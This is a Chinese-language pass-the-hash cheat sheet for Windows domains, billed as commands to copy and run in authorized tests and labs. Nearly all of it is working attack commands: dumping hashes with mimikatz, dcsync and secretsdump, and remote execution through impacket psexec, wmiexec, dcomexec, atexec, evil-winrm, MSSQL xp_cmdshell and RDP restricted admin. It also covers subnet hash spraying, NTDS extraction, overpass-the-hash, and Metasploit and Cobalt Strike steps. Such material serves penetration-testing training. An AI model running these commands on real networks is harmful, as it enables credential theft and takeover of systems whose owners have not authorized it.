# Pass-the-Hash 纯命令版

> 只有命令和一句话说明，全部写死具体值，复制即可执行。
> 配套原理：[哈希传递（Pass-the-Hash）](Pass-the-Hash.md)；落地流程：[操作手册](Pass-the-Hash-操作手册.md)；方法选型：[各方法对比](Pass-the-Hash-各方法对比.md)；MSF 专线：[MSF 下的 PtH 操作](Pass-the-Hash-MSF操作.md)。
>
> 仅限授权测试、靶场和比赛环境。

---

## 阅读方式：这篇是怎么分的

**主线只有一条：按操作顺序走的四个阶段。**

```text
第 1 步  确认能不能打        → 第 1 节
第 2 步  拿到 hash           → 第 2 节
第 3 步  用 hash 打进去       → 第 3 节   ← 全文主体
第 4 步  打完之后的延伸       → 第 4 节
```

**第 3 节内部按「协议」分**，因为"能用哪条协议"由端口决定，这是你现场最先要判断的：

```text
SMB(445) → WMI(135) → DCOM(135) → 计划任务(135) → WinRM(5985) → MSSQL(1433) → RDP(3389)
```

**每个协议用同一套模板**，认准这四个标签就不会乱：

```text
端口        走哪条协议由它决定
首选        这个协议下先试哪条命令
备选        首选不通时换哪条
痕迹        会被记什么日志（判断值不值得用）
```

**MSF 和 Cobalt Strike 放在附录 A**——它们不是新协议，是"换一套工具做同一件事"，所以不混在主线里。

---

## 0. 示例环境

全文命令都用这组具体值，换环境时自己替换：

```text
域控      10.10.10.10        corp.local
目标机    10.10.10.20
用户名    Administrator
NT Hash   31d6cfe0d16ae931b73c59d7e0c089c0
攻击机    10.10.10.128
```

---

# 第 1 步　确认能不能打

## 1. 探路

```bash
nmap -Pn -p 445,135,139,5985,3389,1433 10.10.10.20
```

先看端口，决定第 3 节走哪条协议。

```bash
nxc smb 10.10.10.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d corp.local
```

验证哈希。`[+]` 是认证通过，`(Pwn3d!)` 才是有管理权限。

```bash
nxc smb 10.10.10.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth
```

目标是本地账户时加 `--local-auth`，域账户不加。

```bash
nxc smb 10.10.10.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d corp.local --shares
```

确认 `ADMIN$` 在不在，`psexec` 依赖它。

---

# 第 2 步　拿到 hash

## 2. 四种来源

**本机抓取（有 Windows shell 时）**

```text
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
```

`privilege::debug` 成功会回显 `Privilege '20' OK`，这是读 lsass 的前置条件。

**域内直接要（有域内权限时，首选）**

```text
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
```

不用登录任何目标机，直接向域控复制凭据。

**远程导出（从 Linux 打）**

```bash
impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/Administrator@10.10.10.20
```

```bash
impacket-secretsdump -just-dc-user Administrator -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/Administrator@10.10.10.10
```

第二条只取域管。

**注册表离线（不便落地时）**

先在目标机导出：

```text
reg save hklm\sam sam.save
reg save hklm\system system.save
reg save hklm\security security.save
```

拷回攻击机解析：

```bash
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

---

# 第 3 步　用 hash 打进去

> **按协议分。你先看第 1 节扫出来的端口，直接跳到对应小节。**
> 每个协议都按「端口 / 首选 / 备选 / 痕迹」四段写。

## 3.1 SMB

**端口**：445

**首选 · psexec**（最稳，但最吵）

```bash
impacket-psexec corp.local/Administrator@10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

**备选 · smbexec**（命名管道被限制时）

```bash
impacket-smbexec corp.local/Administrator@10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

**备选 · smbclient**（只访问共享、不执行命令）

```bash
impacket-smbclient corp.local/Administrator@10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

进去后：

```text
shares
use C$
ls
get Windows\Temp\config.txt
```

**痕迹**：7045 服务安装、ADMIN$ 落文件、`PSEXESVC` 服务名

## 3.2 WMI

**端口**：135 + 动态 RPC

**首选 · wmiexec**（不落 exe、不建服务，日常优先用它）

先跑单条命令验证：

```bash
impacket-wmiexec corp.local/Administrator@10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 "whoami"
```

确认没问，再进交互式：

```bash
impacket-wmiexec corp.local/Administrator@10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

**备选 · nxc**

```bash
nxc smb 10.10.10.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d corp.local -x "whoami"
```

**痕迹**：`wmiprvse.exe` 派生异常子进程、4688 进程创建

> ⚠️ `wmiexec` **需要 135 + 动态 RPC 端口**，而 psexec 只要 445。
> 防火墙只放 445 时会出现 psexec 能通、wmiexec 反而不通——跟直觉相反。

## 3.3 DCOM

**端口**：135 + 动态 RPC

**首选 · dcomexec**（隐蔽性最高）

```bash
impacket-dcomexec corp.local/Administrator@10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

默认走 `MMC20.Application`，换其他对象：

```bash
impacket-dcomexec corp.local/Administrator@10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -object ShellWindows
impacket-dcomexec corp.local/Administrator@10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -object ShellBrowserWindow
```

**痕迹**：DCOM 组件被远程调用

> 依赖目标装了哪些 DCOM 组件，不是每台都能用；排错也麻烦，wmiexec 被拦时才试。

## 3.4 计划任务

**端口**：135 + 动态 RPC

**首选 · atexec**

```bash
impacket-atexec corp.local/Administrator@10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 "whoami"
```

**痕迹**：4698 计划任务创建

> ⚠️ 命令写在 `@目标` **之后**，写前面会静默失败。

## 3.5 WinRM

**端口**：5985（HTTP）/ 5986（HTTPS）

**首选 · evil-winrm**（拿到的是真正的 PowerShell 会话）

```bash
evil-winrm -i 10.10.10.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

域账户加 `-d`：

```bash
evil-winrm -i 10.10.10.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d corp.local
```

走 HTTPS：

```bash
evil-winrm -i 10.10.10.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -S
```

**备选 · nxc**（只跑单条命令）

```bash
nxc winrm 10.10.10.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x "whoami"
```

**痕迹**：`wsmprovhost.exe` 进程、4624 登录类型 3

> 445 不通时的主力。只需一个端口，不要动态 RPC。

## 3.6 MSSQL

**端口**：1433

**首选 · mssqlclient**

```bash
impacket-mssqlclient -windows-auth -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/Administrator@10.10.10.20
```

连上后默认没有 `xp_cmdshell`，手动开：

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**备选 · nxc**（只查库）

```bash
nxc mssql 10.10.10.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -q "SELECT @@version"
```

**痕迹**：SQL 日志、`xp_cmdshell` 被启用

## 3.7 RDP

**端口**：3389

**前置条件**：目标必须开 Restricted Admin，否则 RDP 走不了 PtH。

先在目标机上执行（需要有权限）：

```text
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0
```

**首选 · xfreerdp**

```bash
xfreerdp /v:10.10.10.20 /u:Administrator /d:corp.local /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /restricted-admin /cert-ignore /dynamic-resolution
```

**痕迹**：4624 登录类型 10，Restricted Admin 场景是类型 3

---

# 第 4 步　打完之后的延伸

## 4. 批量与升级

**批量验证**（扫网段找哪些机器能用这组哈希）

```bash
nxc smb 10.10.10.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d corp.local
```

```bash
nxc smb 10.10.10.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth
```

本地账户横向换成这条。

**对打通的机器执行命令**

```bash
nxc smb 10.10.10.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d corp.local -x "whoami"
```

**顺手套更多 hash**

```bash
nxc smb 10.10.10.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d corp.local --sam
nxc smb 10.10.10.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d corp.local --lsa
```

```bash
nxc smb 10.10.10.10 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d corp.local --ntds
```

域控上导全量，拿到域管之后才做这一步。

**目标被禁 NTLM 时——Overpass-the-Hash**

```bash
impacket-getTGT corp.local/Administrator -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
export KRB5CCNAME=Administrator.ccache
klist
```

```bash
impacket-wmiexec -k -no-pass corp.local/Administrator@target.corp.local
```

**注意用主机名，不是 IP**——用 IP 会强制走回 NTLM。

Windows 侧用 Rubeus：

```text
Rubeus.exe asktgt /user:Administrator /domain:corp.local /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt
```

---

# 附录 A　换工具做同一件事

> 这不是新协议，是**同一件事换套工具做**。主线走不通或想换姿势时再看这里。

## A.1 Metasploit

**用哈希打进去**

```text
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.10.20
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBDomain corp.local
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/bind_tcp
msf6 exploit(windows/smb/psexec) > run
```

密码位置填哈希。内网机器回连不到攻击机时，**必须改成 `bind_tcp`**。

**在目标机上抓凭据（kiwi）**

```text
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > kiwi_cmd "lsadump::dcsync /domain:corp.local /user:Administrator"
```

kiwi 命令跟 mimikatz 一一对应，记不住就统一用 `kiwi_cmd`：

```text
meterpreter > kiwi_cmd "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe"
```

只影响新弹出的那个 cmd，当前会话不受影响、也控制不到它——所以实战里更常用上面的 psexec 模块。

**批量验证（MSF 版）**

```text
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.10.0/24
msf6 auxiliary(scanner/smb/smb_login) > set SMBUser Administrator
msf6 auxiliary(scanner/smb/smb_login) > set SMBDomain corp.local
msf6 auxiliary(scanner/smb/smb_login) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 auxiliary(scanner/smb/smb_login) > run
```

## A.2 Cobalt Strike

**注入哈希**

```text
beacon> pth corp.local\Administrator 31d6cfe0d16ae931b73c59d7e0c089c0
```

注入后原 beacon 窗口里就能用目标身份访问：

```text
beacon> shell dir \\10.10.10.20\c$
```

**直接拿会话**

```text
beacon> jump psexec     10.10.10.20 http
beacon> jump psexec_psh 10.10.10.20 http
beacon> jump winrm64    10.10.10.20 http
```

`http` 是监听器名，换成你自己的。

**只执行单条命令**

```text
beacon> remote-exec wmi 10.10.10.20 whoami
```

---

# 附录 B　两张速查表

## B.1 端口 → 走哪条协议

```text
445        SMB      → psexec / smbexec / smbclient
135        WMI      → wmiexec / dcomexec / atexec（还需动态 RPC 端口）
5985/5986  WinRM    → evil-winrm
3389       RDP      → xfreerdp（需 Restricted Admin）
1433       MSSQL    → mssqlclient
445 全封            → WinRM，或先建隧道
```

## B.2 报错 → 处理

```text
STATUS_LOGON_FAILURE   hash / 用户名 / 域 写错
STATUS_ACCESS_DENIED   认证过了但权限不够（无 Pwn3d!）
STATUS_NOT_SUPPORTED   目标禁 NTLM → 走 Overpass-the-Hash
Connection timed out   端口不通 → 换协议或建隧道
```

```text
psexec 打不通但 nxc 显示 Pwn3d!   → 试 WinRM
wmiexec 连不上                    → 动态 RPC 端口被封，试 psexec
抓不到明文密码                    → SYSTEM 不是真实登录用户，需降权后抓
本地管理员哈希不通                 → 非 RID 500 受 UAC 远程限制
红日靶场认证失败                   → SMBDomain 填 GOD，不是 god.org
```
